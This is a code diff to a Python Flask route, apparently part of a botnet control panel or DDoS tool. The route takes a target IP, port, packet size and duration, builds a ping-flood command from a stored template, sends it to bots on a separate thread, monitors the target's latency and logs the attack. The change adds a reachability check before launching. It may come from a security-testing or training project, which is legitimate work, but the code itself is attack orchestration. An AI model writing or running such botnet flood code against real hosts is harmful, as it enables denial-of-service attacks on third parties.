@@ -1,5 +1,6 @@
 from flask import Blueprint, request
 from utilities.databaseFunc import *
+from utilities.utilities import *
 import subprocess
 import time
 import socket
@@ -27,37 +28,40 @@ def DDOSAttack():
     attackType = data["attackType"]
     duration = data["duration"]
 
-    command = getCommand("DDOS", "PINGFLOOD")
-    command = command.format(
-        attackType = attackType,
-        packetSize = packetSize,
-        portNumber = portNumber,
-        ipAddress = ipAddress,
-        duration = duration)
+    if isHostReachable(ipAddress):
+        command = getCommand("DDOS", "PINGFLOOD")
+        command = command.format(
+            attackType = attackType,
+            packetSize = packetSize,
+            portNumber = portNumber,
+            ipAddress = ipAddress,
+            duration = duration)
 
-    # create thread for latency polling
-    latencyCheck = threading.Thread(target=checkLatencyPeriodically, args=(ipAddress, duration))
-    latencyCheck.start()
+        # create thread for latency polling
+        latencyCheck = threading.Thread(target=checkLatencyPeriodically, args=(ipAddress, duration))
+        latencyCheck.start()
 
-    # launch dos on bots using a seperate thread
-    bots = threading.Thread(target=botnet, args=(command, duration))
-    bots.start()
-    bots.join()
+        # launch dos on bots using a seperate thread
+        bots = threading.Thread(target=botnet, args=(command, duration))
+        bots.start()
+        bots.join()
 
-    if not cancel_event.is_set():
-        # collect results
-        latency_ping_list_result = list(latencyPingList)  # Copy the list to avoid shared memory issues
+        if not cancel_event.is_set():
+            # collect results
+            latency_ping_list_result = list(latencyPingList)  # Copy the list to avoid shared memory issues
 
-        # log dos attack details to database
-        logActivityDOS("DDOS ATTACK", data, latency_ping_list_result)
+            # log dos attack details to database
+            logActivityDOS("DDOS ATTACK", data, latency_ping_list_result)
 
-    latencyPingList.clear()
-    threads.clear()
-    accepted_addresses.clear()
-    cancel_event.clear()
-    cancelled = False
+        latencyPingList.clear()
+        threads.clear()
+        accepted_addresses.clear()
+        cancel_event.clear()
+        cancelled = False
 
-    return ""
+        return ""
+    else:
+        return {}, 400
 
 def checkLatencyPeriodically(ip_address, duration):
     global latencyPingList
